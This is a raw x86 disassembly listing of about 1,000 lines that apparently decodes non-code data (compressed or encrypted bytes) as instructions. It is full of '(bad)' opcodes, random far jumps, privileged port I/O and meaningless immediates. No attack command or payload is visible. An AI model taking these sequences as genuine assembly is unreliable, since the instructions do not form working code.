  420bd4:	pop    esp
  420bd5:	sub    dh,al
  420bd7:	ror    cl,0x3a
  420bda:	jno    0x420c50
  420bdc:	jnp    0x420b78
  420bde:	and    ebp,ebp
  420be0:	loopne 0x420bc9
  420be2:	les    di,DWORD PTR [ebx]
  420be5:	fdiv   st,st(2)
  420be7:	jmp    0x420ba3
  420be9:	js     0x420b8a
  420beb:	mov    eax,0xd320a8c5
  420bf0:	dec    edi
  420bf1:	push   ebp
  420bf2:	sbb    ecx,DWORD PTR [edx+esi*2-0x3e22fc18]
  420bf9:	xor    eax,0x3f666d55
  420bfe:	xchg   esi,eax
  420bff:	aaa    
  420c00:	frstor [edi-0x47]
  420c03:	mov    ?,ebp
  420c05:	popf   
  420c06:	jmp    0xfd08:0x7cc89da0
  420c0d:	or     eax,DWORD PTR [ecx+0x69748dbf]
  420c13:	cld    
  420c14:	and    eax,0x35ffade3
  420c19:	cli    
  420c1a:	je     0x420c72
  420c1c:	retf   
  420c1d:	push   cs
  420c1e:	inc    ecx
  420c1f:	add    dl,bl
  420c21:	test   BYTE PTR [ecx+eax*8-0x5b030205],dl
  420c28:	inc    eax
  420c29:	arpl   WORD PTR [edi-0x7b],di
  420c2c:	add    al,0x91
  420c2e:	inc    edi
  420c2f:	out    0x5e,eax
  420c31:	and    al,0x5a
  420c33:	pop    edx
  420c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c35:	pop    ebp
  420c36:	xchg   edi,eax
  420c37:	outs   dx,BYTE PTR ds:[esi]
  420c38:	inc    ebx
  420c39:	bound  esp,QWORD PTR [esi+0x2e]
  420c3c:	mov    ebx,DWORD PTR [ebp+0x64245125]
  420c42:	jmp    0x5228:0x855f06da
  420c49:	push   cs
  420c4a:	imul   DWORD PTR [edi+0x1c]
  420c4d:	fnstsw WORD PTR [edi-0x79]
  420c50:	out    0x2a,al
  420c52:	pop    ecx
  420c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c54:	cmp    DWORD PTR [eax+0x48],ebp
  420c57:	stc    
  420c58:	scas   al,BYTE PTR es:[edi]
  420c59:	loop   0x420c21
  420c5b:	leave  
  420c5c:	cmp    bl,ah
  420c5e:	fwait
  420c5f:	enter  0xce4a,0x7
  420c63:	push   0xca9fba5c
  420c68:	adc    BYTE PTR [esi-0x10],dl
  420c6b:	popa   
  420c6c:	popf   
  420c6d:	cmp    cl,bh
  420c6f:	mov    BYTE PTR [eax+esi*8],dh
  420c72:	dec    ebp
  420c73:	cwde   
  420c74:	mov    al,ds:0x1915aed8
  420c79:	xor    edi,DWORD PTR [esi+0x76]
  420c7c:	out    0x9e,eax
  420c7e:	mov    al,ds:0x201b7ea2
  420c83:	xchg   DWORD PTR [edx+eiz*8-0x16],edx
  420c87:	or     eax,0xa383af62
  420c8c:	and    ecx,esi
  420c8e:	in     al,0xdc
  420c90:	inc    ebp
  420c91:	daa    
  420c92:	xor    ebx,edi
  420c94:	test   al,0x71
  420c96:	xchg   ebx,eax
  420c97:	jnp    0x420cde
  420c99:	imul   BYTE PTR [ecx+0x3eb2ab52]
  420c9f:	pop    edi
  420ca0:	sbb    BYTE PTR ds:0xe7bc1e82,0x90
  420ca7:	xor    ebp,DWORD PTR [edx+ebp*1+0x67]
  420cab:	(bad)  
  420cad:	inc    ebp
  420cae:	retf   0x115d
  420cb1:	lea    eax,[eax+ebx*2+0x53]
  420cb5:	xor    eax,0x35a116cb
  420cba:	cmp    DWORD PTR [edi-0x66],0xffffffd5
  420cbe:	mov    ss:0xf9ddb3dd,al
  420cc4:	(bad)  
  420cc5:	fmul   QWORD PTR [edx+ebx*4+0x4111020c]
  420ccc:	pop    esi
  420ccd:	inc    ebp
  420cce:	push   ebp
  420ccf:	dec    ebx
  420cd0:	rol    BYTE PTR [ebp+0x18094e22],cl
  420cd6:	mov    al,0xe3
  420cd8:	jge    0x420cbd
  420cda:	(bad)  
  420cdb:	fnsave [edx-0x38468454]
  420ce1:	and    al,0x88
  420ce3:	stos   DWORD PTR es:[edi],eax
  420ce4:	inc    eax
  420ce5:	jl     0x420cfc
  420ce7:	retf   
  420ce8:	xchg   ebp,eax
  420ce9:	jns    0x420d39
  420ceb:	xor    DWORD PTR [esi+0x19],ebp
  420cee:	xchg   edi,eax
  420cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cf0:	push   0x6d383630
  420cf5:	inc    esi
  420cf6:	sub    al,bl
  420cf8:	push   edi
  420cf9:	mov    ch,0x7a
  420cfb:	pop    ebp
  420cfc:	mov    ecx,0x232e5ddf
  420d01:	inc    eax
  420d02:	shl    DWORD PTR [eax],cl
  420d04:	fidiv  DWORD PTR cs:[ebx-0xf]
  420d08:	jmp    0x79dd:0x9cd3e726
  420d0f:	call   DWORD PTR fs:[ebp+0xa666263]
  420d16:	aaa    
  420d17:	out    dx,eax
  420d18:	dec    ebx
  420d19:	stos   BYTE PTR es:[edi],al
  420d1a:	inc    dl
  420d1c:	repnz loopne 0x420cf6
  420d1f:	or     BYTE PTR [edi+0x3d],bh
  420d22:	repnz sbb al,0x76
  420d25:	adc    BYTE PTR [edi+0x3d022b49],ch
  420d2b:	cwde   
  420d2c:	dec    ebx
  420d2d:	repz and DWORD PTR [ecx-0x34],0x56
  420d32:	adc    DWORD PTR [ebx+esi*4+0x499fd0eb],ecx
  420d39:	retf   
  420d3a:	shl    eax,0xd6
  420d3d:	loop   0x420d05
  420d3f:	xchg   ecx,eax
  420d40:	mov    ecx,0x14430432
  420d45:	rcl    BYTE PTR [eax],cl
  420d47:	outs   dx,DWORD PTR ds:[esi]
  420d48:	pop    esi
  420d49:	je     0x420ce6
  420d4b:	add    eax,0x4435edac
  420d50:	sub    al,0xbb
  420d52:	mov    ecx,0x33adada2
  420d57:	clc    
  420d58:	dec    ebp
  420d59:	nop
  420d5a:	inc    ebp
  420d5b:	int3   
  420d5c:	dec    eax
  420d5d:	xlat   BYTE PTR ds:[ebx]
  420d5e:	pop    ecx
  420d5f:	pmaxsw mm3,QWORD PTR [ebx]
  420d62:	push   0x348edea3
  420d67:	sti    
  420d68:	inc    edx
  420d69:	mov    eax,ds:0x5b440d1a
  420d6e:	js     0x420dce
  420d70:	(bad)  
  420d71:	jb     0x420d41
  420d73:	icebp  
  420d74:	inc    eax
  420d75:	(bad)  
  420d76:	(bad)  
  420d77:	enter  0x88e5,0x64
  420d7b:	cmp    BYTE PTR [esi-0x3d97208a],al
  420d81:	ror    ecx,cl
  420d83:	lds    edi,FWORD PTR [esi+ebx*8+0x5ddb51ee]
  420d8a:	and    al,0x19
  420d8c:	jnp    0x420d98
  420d8e:	test   DWORD PTR [edx],edx
  420d90:	adc    al,0x31
  420d92:	xor    al,0x73
  420d94:	cmp    al,0xae
  420d96:	cli    
  420d97:	pusha  
  420d98:	add    al,0xcc
  420d9a:	arpl   dx,ax
  420d9c:	in     eax,0x1a
  420d9e:	mov    al,0xbd
  420da0:	xchg   ebx,eax
  420da1:	les    ebp,FWORD PTR [esp+ebx*2-0x1b227f20]
  420da8:	pushf  
  420da9:	dec    esi
  420daa:	mov    edi,0x929fe10
  420daf:	jbe    0x420d4f
  420db1:	pop    ecx
  420db2:	mov    ecx,0xdaf0567f
  420db7:	das    
  420db8:	adc    eax,0x84c7ff71
  420dbd:	push   ds
  420dbe:	mov    bh,0x75
  420dc0:	xchg   esp,eax
  420dc1:	adc    eax,0x4380c0d4
  420dc6:	jnp    0x420d4f
  420dc8:	ins    DWORD PTR es:[edi],dx
  420dc9:	add    dl,bh
  420dcb:	mov    edx,0x31aec888
  420dd0:	xor    eax,0x16a3364
  420dd5:	sbb    eax,DWORD PTR [ebx-0x3b]
  420dd8:	inc    ebp
  420dd9:	jmp    0x420dcd
  420ddb:	das    
  420ddc:	test   DWORD PTR [edi+0x34],ecx
  420ddf:	clc    
  420de0:	fnstenv [edi]
  420de2:	adc    ebx,ebp
  420de4:	out    0x39,eax
  420de6:	xchg   DWORD PTR [edi],edx
  420de8:	fidivr DWORD PTR [ebp-0x4934350d]
  420dee:	and    bh,BYTE PTR [ebp+0x2e]
  420df1:	mov    dl,0x40
  420df3:	xor    al,0x9d
  420df5:	jg     0x420e04
  420df7:	mov    fs:0x37c2def1,eax
  420dfd:	in     al,0xac
  420dff:	jno    0x420d84
  420e01:	pop    es
  420e02:	leave  
  420e03:	push   ebx
  420e04:	out    0xb1,eax
  420e06:	or     DWORD PTR [edx+0x30642dea],eax
  420e0c:	push   esp
  420e0d:	dec    edi
  420e0e:	jo     0x420e84
  420e10:	pusha  
  420e11:	aad    0x73
  420e13:	dec    edi
  420e14:	adc    bl,BYTE PTR [ebx]
  420e16:	jge    0x420e59
  420e18:	sar    BYTE PTR [ebp+0x64],1
  420e1b:	mov    bl,0x79
  420e1d:	jmp    0x8566:0x118a205b
  420e24:	ins    BYTE PTR es:[edi],dx
  420e25:	loopne 0x420e63
  420e27:	sbb    ebp,ebp
  420e29:	lea    esi,[ebx]
  420e2b:	jns    0x420dff
  420e2d:	xchg   edx,eax
  420e2e:	(bad)  
  420e2f:	idiv   BYTE PTR [ebx+0x291a1dac]
  420e35:	sbb    eax,0xb66edeb4
  420e3a:	or     al,0x6c
  420e3c:	loopne 0x420e86
  420e3e:	or     dh,BYTE PTR [edi]
  420e40:	ucomiss xmm7,DWORD PTR [eax-0x5b]
  420e44:	mov    ch,0xe
  420e46:	push   es
  420e47:	inc    esp
  420e48:	push   edi
  420e49:	jbe    0x420e50
  420e4b:	fchs   
  420e4d:	adc    DWORD PTR [esi-0x13847078],ebp
  420e53:	mov    dl,0x64
  420e55:	mov    ah,0x1c
  420e57:	mov    eax,DWORD PTR [eax-0x7aa73114]
  420e5d:	and    edi,0xffffffbb
  420e60:	push   cs
  420e61:	mov    ecx,0xa76d8e70
  420e66:	test   cl,dl
  420e68:	test   eax,0x4dfca85d
  420e6d:	pop    ss
  420e6e:	dec    edi
  420e6f:	scas   al,BYTE PTR es:[edi]
  420e70:	loope  0x420e97
  420e72:	and    DWORD PTR ds:0x1d0fdd3f,esp
  420e78:	into   
  420e79:	ror    DWORD PTR [ecx-0xede4359],1
  420e7f:	mov    bl,0x50
  420e81:	out    dx,al
  420e82:	pop    ds
  420e83:	adc    BYTE PTR [edi-0x35],al
  420e86:	pusha  
  420e87:	retf   0x6dd1
  420e8a:	push   edi
  420e8b:	sub    cl,ah
  420e8d:	mov    BYTE PTR [ecx+0x6dc9159c],cl
  420e93:	or     eax,0x4811dd4b
  420e98:	popf   
  420e99:	addr16 jg 0x420e77
  420e9c:	mov    al,0x8e
  420e9e:	aaa    
  420e9f:	sbb    esp,ebp
  420ea1:	icebp  
  420ea2:	sbb    ecx,DWORD PTR [ebp+0x7c49d51]
  420ea8:	inc    esi
  420ea9:	addr16 in al,dx
  420eab:	xchg   ebx,eax
  420eac:	mov    dh,0x74
  420eae:	or     DWORD PTR [ebp+0x5cc970af],0xf7e17805
  420eb8:	aad    0xd4
  420eba:	dec    eax
  420ebb:	(bad)  
  420ebc:	xchg   edx,eax
  420ebd:	call   0x2634:0x37a35ee4
  420ec4:	mov    edi,0x592b1ad4
  420ec9:	js     0x420e55
  420ecb:	sbb    edi,DWORD PTR [ebx]
  420ecd:	aas    
  420ece:	arpl   si,dx
  420ed0:	repnz xor ebp,DWORD PTR ds:0x56b0916c
  420ed7:	dec    eax
  420ed8:	shl    DWORD PTR [ebx+0x30],1
  420edb:	lods   eax,DWORD PTR ds:[esi]
  420edc:	fs lods al,BYTE PTR es:[esi]
  420edf:	cs mov cl,0x1e
  420ee2:	sbb    edx,edi
  420ee4:	cmp    edx,DWORD PTR ds:[ecx+0x6aec462f]
  420eeb:	js     0x420e70
  420eed:	ins    BYTE PTR es:[edi],dx
  420eee:	fisubr DWORD PTR [edi+0x4257da05]
  420ef4:	jne    0x420ed4
  420ef6:	mov    edi,0x5aac7482
  420efb:	xchg   DWORD PTR [edx+0x632a0a],edx
  420f01:	mov    eax,0x24e3cada
  420f06:	mov    ch,0x55
  420f08:	sub    al,dh
  420f0a:	pop    edx
  420f0b:	call   0x3e10:0xbf7ef604
  420f12:	mov    bl,0x27
  420f14:	ins    DWORD PTR es:[edi],dx
  420f15:	shl    DWORD PTR [eax-0x7c],1
  420f18:	data16 fcom DWORD PTR [ecx-0x3e0be626]
  420f1f:	loop   0x420f42
  420f21:	mov    al,0xdc
  420f23:	dec    ebx
  420f24:	(bad)  
  420f25:	les    ebx,FWORD PTR [ebx+eiz*4]
  420f28:	jno    0x420f5f
  420f2a:	aas    
  420f2b:	popa   
  420f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f2d:	mov    ds:0xf887595e,al
  420f32:	fild   QWORD PTR [ecx+eiz*2+0x41]
  420f36:	outs   dx,BYTE PTR ds:[esi]
  420f37:	pop    esp
  420f38:	test   al,0xfc
  420f3a:	enter  0xdd23,0xa6
  420f3e:	aam    0x53
  420f40:	xchg   edx,eax
  420f41:	jno    0x420f94
  420f43:	pop    esp
  420f44:	pop    edi
  420f45:	add    al,0x6
  420f47:	jp     0x420f01
  420f49:	inc    esp
  420f4a:	scas   al,BYTE PTR es:[edi]
  420f4b:	jns    0x420fb2
  420f4d:	(bad)  
  420f4e:	loop   0x420ed9
  420f50:	xor    al,0xca
  420f52:	sbb    bl,BYTE PTR [esi+0x8]
  420f55:	retf   
  420f56:	mov    ah,0x7
  420f58:	xchg   esi,eax
  420f59:	xchg   ebp,eax
  420f5a:	cli    
  420f5b:	push   esp
  420f5c:	je     0x420fc9
  420f5e:	push   edi
  420f5f:	je     0x420f03
  420f61:	mov    cl,bh
  420f63:	mov    WORD PTR [ebp+0x32358f73],?
  420f69:	fistp  WORD PTR [ecx]
  420f6b:	and    esi,ebx
  420f6d:	aad    0x38
  420f6f:	add    BYTE PTR [ebx-0x31c63948],bl
  420f75:	push   edx
  420f76:	mov    eax,ds:0xa59e1bc9
  420f7b:	fidivr WORD PTR [edi+0x15]
  420f7e:	test   eax,0xb87ef24d
  420f83:	std    
  420f84:	stos   BYTE PTR es:[edi],al
  420f85:	and    eax,0xc1889424
  420f8a:	scas   al,BYTE PTR es:[edi]
  420f8b:	cmp    ah,BYTE PTR [ebx+0x42ea1934]
  420f91:	ret    0x90ac
  420f94:	or     BYTE PTR ds:0xd5cb6fb3,bl
  420f9a:	out    dx,al
  420f9b:	mov    bl,0xdc
  420f9d:	mov    ah,0x2b
  420f9f:	(bad)  
  420fa0:	stc    
  420fa1:	jge    0x421016
  420fa3:	popf   
  420fa4:	dec    ebp
  420fa5:	in     al,0x9f
  420fa7:	push   esi
  420fa8:	add    eax,0xae16297
  420fad:	into   
  420fae:	shl    dh,cl
  420fb0:	pushf  
  420fb1:	pop    ecx
  420fb2:	jo     0x420fe3
  420fb4:	std    
  420fb5:	inc    esi
  420fb6:	sahf   
  420fb7:	mov    ds:0xb127e80,eax
  420fbc:	in     al,0xaa
  420fbe:	push   edi
  420fbf:	push   esp
  420fc0:	mov    dl,dh
  420fc2:	stc    
  420fc3:	mov    WORD PTR [edx-0xf3e981c],es
  420fc9:	test   eax,0xbeb090b0
  420fce:	jmp    0x73ac:0x8ad12195
  420fd5:	pop    ebp
  420fd6:	inc    esp
  420fd7:	add    eax,0x640b7867
  420fdc:	invd   
  420fde:	int    0x38
  420fe0:	inc    eax
  420fe1:	cmp    al,0xe4
  420fe3:	push   es
  420fe4:	fsub   st,st(1)
  420fe6:	jmp    0x420f88
  420fe8:	pop    edi
  420fe9:	mov    ebx,0x33792c77
  420fee:	adc    edx,ecx
  420ff0:	mov    gs,esp
  420ff2:	jo     0x420ff8
  420ff4:	mov    esp,0xc313a66d
  420ff9:	sub    BYTE PTR [ebx+0x7b],bl
  420ffc:	push   cs
  420ffd:	outs   dx,BYTE PTR ds:[esi]
  420ffe:	(bad)  
  420fff:	pop    ss
  421000:	sti    
  421001:	add    al,0x59
  421003:	push   ebx
  421004:	outs   dx,BYTE PTR ds:[esi]
  421005:	popa   
  421006:	scas   eax,DWORD PTR es:[edi]
  421007:	adc    al,0x64
  421009:	inc    edi
  42100a:	push   ebx
  42100b:	push   0x8d6de014
  421010:	and    DWORD PTR ss:[eax],esi
  421013:	adc    BYTE PTR [edi],dh
  421015:	jecxz  0x420fbf
  421017:	leave  
  421018:	cmp    edi,DWORD PTR [esi]
  42101a:	cdq    
  42101b:	jae    0x420f9f
  42101d:	fadd   QWORD PTR [ebx]
  42101f:	addr16 push ebx
  421021:	jne    0x421065
  421023:	mov    ds:0x20d44c49,eax
  421028:	inc    ebp
  421029:	addr16 ret 0x29b
  42102d:	jnp    0x420fe0
  42102f:	fidivr DWORD PTR [ecx+0x745427d0]
  421035:	shr    BYTE PTR ds:0xb872d08e,cl
  42103b:	inc    ebx
  42103c:	and    al,0xda
  42103e:	xor    al,0x31
  421040:	sub    BYTE PTR [ecx],cl
  421042:	fstp   DWORD PTR [edx-0x68]
  421045:	stos   BYTE PTR es:[edi],al
  421046:	dec    ecx
  421047:	js     0x420feb
  421049:	icebp  
  42104a:	xchg   ebx,eax
  42104b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42104c:	xchg   edi,eax
  42104d:	dec    ebp
  42104e:	adc    DWORD PTR [ebx-0x6dadebd8],eax
  421054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421055:	cmp    BYTE PTR [ecx],dh
  421057:	imul   BYTE PTR [edx+0x38]
  42105a:	push   eax
  42105b:	fidiv  WORD PTR [ebp-0xf]
  42105e:	mov    eax,0x49ea4e40
  421063:	dec    ebp
  421064:	rol    bh,cl
  421066:	into   
  421067:	ins    BYTE PTR es:[edi],dx
  421068:	or     BYTE PTR [edx+0x49bdf8c6],cl
  42106e:	loop   0x42109e
  421070:	jl     0x42105d
  421072:	mov    WORD PTR [ebp+ebp*2-0x8],gs
  421076:	stc    
  421077:	cmp    bl,bl
  421079:	ins    BYTE PTR es:[edi],dx
  42107a:	push   0xfffffffb
  42107c:	xor    BYTE PTR [edi],bl
  42107e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42107f:	inc    ecx
  421080:	or     esp,DWORD PTR [edi-0x4a78d930]
  421086:	loop   0x4210ac
  421088:	cld    
  421089:	cmp    eax,0xa493e05b
  42108e:	(bad)  
  42108f:	adc    esp,DWORD PTR [edi+0x3a8af8e7]
  421095:	mov    bh,0xd8
  421097:	cmp    BYTE PTR [ebp-0x40],ch
  42109a:	dec    ecx
  42109b:	es leave 
  42109d:	jmp    0xd4cc:0x3e0cdf94
  4210a4:	cwde   
  4210a5:	sub    esi,DWORD PTR [eax+0x10]
  4210a8:	les    esi,FWORD PTR [edx]
  4210aa:	std    
  4210ab:	icebp  
  4210ac:	outs   dx,DWORD PTR ds:[esi]
  4210ad:	inc    esp
  4210ae:	call   0x600affe4
  4210b3:	push   eax
  4210b4:	retf   
  4210b5:	outs   dx,DWORD PTR ds:[esi]
  4210b6:	adc    eax,0xd516eca0
  4210bb:	mov    ch,0xa2
  4210bd:	jg     0x42108e
  4210bf:	xor    al,0x9d
  4210c1:	ret    
  4210c2:	std    
  4210c3:	and    ch,bl
  4210c5:	pop    ss
  4210c6:	ficomp WORD PTR [edx-0xd]
  4210c9:	scas   eax,DWORD PTR es:[edi]
  4210ca:	in     al,0xbf
  4210cc:	add    BYTE PTR [esi+0x128f90a6],al
  4210d2:	xchg   edx,eax
  4210d3:	xor    al,0x20
  4210d5:	pop    edx
  4210d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210d7:	xchg   edi,eax
  4210d8:	mov    cl,dh
  4210da:	pop    edi
  4210db:	pusha  
  4210dc:	jge    0x42111c
  4210de:	std    
  4210df:	aaa    
  4210e0:	mov    bl,0x11
  4210e2:	and    BYTE PTR [eax],al
  4210e4:	lods   eax,DWORD PTR ds:[esi]
  4210e5:	test   eax,0x95d8abe7
  4210ea:	das    
  4210eb:	xchg   edx,eax
  4210ec:	icebp  
  4210ed:	gs jg  0x4210e2
  4210f0:	sub    DWORD PTR [ebx+0x1ddbaccd],ebx
  4210f6:	popa   
  4210f7:	popa   
  4210f8:	inc    ebx
  4210f9:	or     eax,0x1209b0c8
  4210fe:	xchg   bx,ax
  421100:	or     eax,0x3e59a8ba
  421105:	ret    
  421106:	add    eax,0x7f7b9e7a
  42110b:	dec    ebx
  42110c:	sahf   
  42110d:	sub    ecx,DWORD PTR [esi+0x38]
  421110:	mov    edi,0x1afd1147
  421115:	mov    BYTE PTR [esp+edx*4+0x2d46eee2],al
  42111c:	pop    ebp
  42111d:	test   eax,0xf0707b3f
  421122:	and    ch,BYTE PTR [ecx-0x3d]
  421125:	sub    DWORD PTR [edi],esi
  421127:	sub    al,0x98
  421129:	adc    DWORD PTR ss:[ecx-0x650dd94f],0x63
  421131:	and    eax,0xce17c357
  421136:	mov    ebx,DWORD PTR ds:0xeab62eb1
  42113c:	cdq    
  42113d:	xchg   DWORD PTR [ebx+0x12e051f5],edi
  421143:	xor    dl,ch
  421145:	mov    ah,0xde
  421147:	inc    esp
  421148:	out    0xc9,eax
  42114a:	fwait
  42114b:	dec    esp
  42114c:	xchg   ecx,eax
  42114d:	xchg   ecx,eax
  42114e:	loopne 0x421116
  421150:	xor    eax,0x20f2473e
  421155:	pop    ds
  421156:	and    BYTE PTR [ecx],dh
  421158:	jle    0x4211a8
  42115a:	iret   
  42115b:	mov    ecx,0x33c8e727
  421160:	stc    
  421161:	arpl   WORD PTR [edi+ebp*2],sp
  421164:	retf   
  421165:	adc    DWORD PTR [edi],edi
  421167:	mov    al,0x3d
  421169:	not    BYTE PTR ds:0x6f3a9069
  42116f:	int    0x4b
  421171:	call   0x1842:0x6fd8fd95
  421178:	out    0x79,eax
  42117a:	fld    QWORD PTR [edx+0x5efd5e2c]
  421180:	cmp    DWORD PTR [edx-0x5],ecx
  421183:	mov    ds:0x8c60b1ba,eax
  421188:	mov    esp,0x4b044233
  42118d:	and    DWORD PTR [ebx+0x21],ebx
  421190:	inc    ebx
  421191:	aas    
  421192:	xor    bh,cl
  421194:	push   edx
  421195:	cdq    
  421196:	xchg   BYTE PTR [esi-0x4029a033],dl
  42119c:	in     al,dx
  42119d:	mov    dh,BYTE PTR [edx-0x3a7a4f0c]
  4211a3:	out    0x21,eax
  4211a5:	xchg   al,ah
  4211a7:	dec    ecx
  4211a8:	addr16 mov ds:0xb2ca,al
  4211ac:	inc    edx
  4211ad:	pop    ecx
  4211ae:	sbb    DWORD PTR [eax],eax
  4211b0:	add    ebp,ebx
  4211b2:	inc    DWORD PTR [esi-0x40]
  4211b5:	cs daa 
  4211b7:	mov    al,0x9c
  4211b9:	adc    al,BYTE PTR [edi+ebp*2-0x42]
  4211bd:	mov    al,ds:0xcdaf1475
  4211c2:	xchg   bl,ah
  4211c4:	gs ret 
  4211c6:	pop    es
  4211c7:	pop    es
  4211c8:	push   esi
  4211c9:	sub    eax,0xd3c6dd81
  4211ce:	rcr    ebp,cl
  4211d0:	pop    edi
  4211d1:	push   esp
  4211d2:	(bad)  [eax]
  4211d4:	adc    cl,BYTE PTR [esi]
  4211d6:	(bad)
  4211d9:	jbe    0x42120f
  4211db:	mov    cl,0x7a
  4211dd:	loop   0x4211b6
  4211df:	mov    ah,0x98
  4211e1:	icebp  
  4211e2:	sub    al,al
  4211e4:	int3   
  4211e5:	sar    DWORD PTR [ebx+ecx*1-0x47bdc13e],cl
  4211ec:	xor    al,0x66
  4211ee:	or     ch,ch
  4211f0:	push   esp
  4211f1:	inc    esi
  4211f2:	cwde   
  4211f3:	add    al,dl
  4211f5:	iret   
  4211f6:	ror    DWORD PTR [esi],cl
  4211f8:	push   eax
  4211f9:	push   ds
  4211fa:	icebp  
  4211fb:	or     dh,0x76
  4211fe:	xor    al,0x43
  421200:	jo     0x4211a3
  421202:	push   0xffffffa1
  421204:	lfs    eax,FWORD PTR [edi-0x54]
  421208:	and    bh,BYTE PTR [ecx-0x46ce7497]
  42120e:	ret    
  42120f:	mov    eax,ds:0xf103c114
  421214:	in     eax,dx
  421215:	hlt    
  421216:	add    edi,edi
  421218:	ins    BYTE PTR es:[edi],dx
  421219:	sub    dh,BYTE PTR es:[edi+ecx*1]
  42121d:	cmp    BYTE PTR [edx+eiz*1],dh
  421220:	xchg   ebp,eax
  421221:	push   ecx
  421222:	add    ch,dh
  421224:	loopne 0x421247
  421226:	or     DWORD PTR [esp+ebx*2],esi
  421229:	xchg   ecx,eax
  42122a:	(bad)  
  42122c:	and    DWORD PTR [eax-0x44b07512],edi
  421232:	mov    ds:0x7ac331af,eax
  421237:	in     al,0x93
  421239:	addr16 add al,bl
  42123c:	std    
  42123d:	jnp    0x421257
  42123f:	dec    edi
  421240:	add    bh,0x2d
  421243:	lods   eax,DWORD PTR ds:[esi]
  421244:	add    eax,0x192549ce
  421249:	fs inc ebx
  42124b:	cli    
  42124c:	pop    es
  42124d:	jae    0x421212
  42124f:	daa    
  421250:	mov    di,0x9ff4
  421254:	aas    
  421255:	or     al,BYTE PTR [ebx+0x79]
  421258:	pslld  mm6,QWORD PTR [edi]
  42125b:	daa    
  42125c:	inc    edi
  42125d:	xor    esi,0xffffffc8
  421260:	std    
  421261:	inc    eax
  421262:	xor    DWORD PTR [eax-0x5509f9de],esp
  421268:	inc    esp
  421269:	xchg   ebp,eax
  42126a:	push   0xffffff96
  42126c:	gs ins BYTE PTR es:[edi],dx
  42126e:	cmp    ch,BYTE PTR [esi]
  421270:	push   ds
  421271:	xchg   esi,eax
  421272:	cdq    
  421273:	and    BYTE PTR [ecx-0x70],al
  421276:	test   BYTE PTR [edi+0x1172dae7],0x2f
  42127d:	jo     0x42127a
  42127f:	adc    eax,0x7758330b
  421284:	cmp    BYTE PTR [eax],ch
  421286:	sbb    eax,0x27a7d962
  42128b:	(bad)  
  42128c:	cmp    al,0xee
  42128e:	in     al,0x63
  421290:	lea    esp,[eax-0x7105dc14]
  421296:	mov    ch,0x23
  421298:	jg     0x4212f8
  42129a:	xor    al,0xf0
  42129c:	out    dx,eax
  42129d:	add    dh,BYTE PTR [ebp+0x6a38da13]
  4212a3:	adc    ecx,DWORD PTR [edx+0x7b9d570e]
  4212a9:	or     bl,BYTE PTR [edx]
  4212ab:	mov    al,0x10
  4212ad:	adc    ah,BYTE PTR [ecx]
  4212af:	mov    edx,0x989da0f0
  4212b4:	fsubr  st,st(5)
  4212b6:	call   0x36d2:0xde4126a4
  4212bd:	adc    ecx,DWORD PTR [edx-0x6a]
  4212c0:	jecxz  0x42131e
  4212c2:	or     al,0x34
  4212c4:	add    al,0x39
  4212c6:	cli    
  4212c7:	(bad)  
  4212c8:	out    0x53,eax
  4212ca:	xor    eax,DWORD PTR [ebx]
  4212cc:	mov    eax,ds:0x7a1c0809
  4212d1:	sbb    al,0x5f
  4212d3:	addr16 icebp 
  4212d5:	push   edx
  4212d6:	push   ds
  4212d7:	push   edx
  4212d8:	in     al,dx
  4212d9:	dec    esp
  4212da:	icebp  
  4212db:	fsub   DWORD PTR [edx-0x60363826]
  4212e1:	das    
  4212e2:	sbb    al,0x19
  4212e4:	mov    dl,0xe9
  4212e6:	cmp    DWORD PTR [ebp+eiz*8-0x70],ebp
  4212ea:	mov    ebx,0xd5f0657f
  4212ef:	repnz outs dx,DWORD PTR ds:[esi]
  4212f1:	pop    es
  4212f2:	faddp  st(0),st
  4212f4:	fbld   TBYTE PTR [esp+ebx*4+0x6275a0a3]
  4212fb:	dec    edx
  4212fc:	fwait
  4212fd:	nop
  4212fe:	push   esi
  4212ff:	aaa    
  421300:	aad    0x1e
  421302:	out    dx,al
  421303:	daa    
  421304:	fwait
  421305:	(bad)
  421308:	sub    BYTE PTR [edx],cl
  42130a:	enter  0x28fe,0xc8
  42130e:	ror    esp,1
  421310:	fsubrp st(0),st
  421312:	xchg   ebp,eax
  421313:	xchg   edx,eax
  421314:	sbb    BYTE PTR [edx+0x3b52acaf],al
  42131a:	sbb    eax,0xa09f9bda
  42131f:	mov    edi,0xa747f130
  421324:	jno    0x4212af
  421326:	sbb    BYTE PTR [ecx],0x1c
  421329:	ss cld 
  42132b:	push   ecx
  42132c:	repz imul DWORD PTR [ebp-0x145e56]
  421333:	adc    BYTE PTR [edx-0x64],0x6
  421337:	mov    edx,0x3f3f15d5
  42133c:	push   ebp
  42133d:	jmp    0x78a5:0x4b5f783
  421344:	mov    dh,0x6c
  421346:	push   esp
  421347:	add    eax,0x8f970548
  42134c:	bound  ecx,QWORD PTR [ebx-0x11]
  42134f:	stos   BYTE PTR es:[edi],al
  421350:	inc    edi
  421351:	retf   
  421352:	sub    ch,BYTE PTR [edx]
  421354:	jne    0x42131c
  421356:	inc    esp
  421357:	lds    ebp,FWORD PTR [eax]
  421359:	xchg   ebp,eax
  42135a:	jecxz  0x4213b6
  42135c:	pop    ds
  42135d:	shl    ch,cl
  42135f:	push   ebp
  421360:	and    al,0x9c
  421362:	sahf   
  421363:	or     bh,BYTE PTR [eax-0x75ef5280]
  421369:	(bad)  
  42136a:	jnp    0x421396
  42136c:	repnz cdq 
  42136e:	or     DWORD PTR [ebx],ebp
  421370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421371:	sub    ah,dl
  421373:	xor    DWORD PTR [ebp-0x1840e7e3],edi
  421379:	xchg   ebx,eax
  42137a:	xor    BYTE PTR [ecx+0x5f],bh
  42137d:	or     eax,0x302f8c1d
  421382:	fidivr WORD PTR [eax-0x17]
  421385:	aam    0x2a
  421387:	push   edx
  421388:	outs   dx,BYTE PTR ds:[esi]
  421389:	jns    0x4213ee
  42138b:	fs sbb eax,0xb4c5f2f7
  421391:	adc    edx,DWORD PTR [esi+0x45fdc30]
  421397:	cmp    DWORD PTR [edi-0xa],edx
